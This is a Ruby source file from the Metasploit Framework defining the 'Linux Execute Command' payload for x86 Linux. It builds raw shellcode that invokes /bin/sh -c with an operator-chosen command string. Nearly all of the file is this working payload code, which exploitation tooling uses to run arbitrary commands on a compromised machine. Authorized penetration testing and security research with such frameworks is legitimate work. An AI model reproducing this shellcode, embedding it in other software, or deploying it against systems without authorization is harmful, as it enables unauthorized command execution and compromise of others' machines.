##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Execute Command',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'vlad902',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86))

		# Register exec options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], self.class)
	end

	#
	# Dynamically builds the exec payload based on the user's options.
	#
	def generate_stage
		cmd     = datastore['CMD'] || ''
		payload =
			"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
			"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
			Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00"     +
			"\x57\x53\x89\xe1\xcd\x80"
	end

end
